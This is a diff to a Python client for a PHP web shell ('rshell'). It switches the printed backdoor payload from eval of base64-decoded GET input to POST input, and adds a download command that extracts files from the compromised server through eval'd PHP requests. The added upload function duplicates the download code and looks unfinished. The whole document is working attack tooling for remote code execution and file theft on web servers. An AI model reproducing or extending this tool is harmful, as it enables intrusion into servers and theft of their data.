@@ -30,6 +30,9 @@ class rshell(Cmd):
         if code == 200:
             print response
 
+    def emptyline(self):
+        print "Deja de darle al enter"
+
     def do_quit(self, line):
         exit(0)
 
@@ -80,9 +83,19 @@ class rshell(Cmd):
         self.dorequest(s)
 
     def print_payload(self):
-        print "<?php eval(base64_decode($_GET['param'])); ?>"
+        print "<?php eval(base64_decode($_POST['param'])); ?>"
 
     def do_download(self, line):
+        files = line.split()
+        cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
+        (code, data) = self.dorequest(cmd)
+        if code == 200:
+            f = file(os.path.basename(files[0]), "w")
+            f.write(base64.decodestring(data))
+        else:
+            print "Error"
+
+    def do_upload(self, line):
         files = line.split()
         cmd = "echo base64_encode(file_get_contents('{0}'));".format(files[0])
         (code, data) = self.dorequest(cmd)
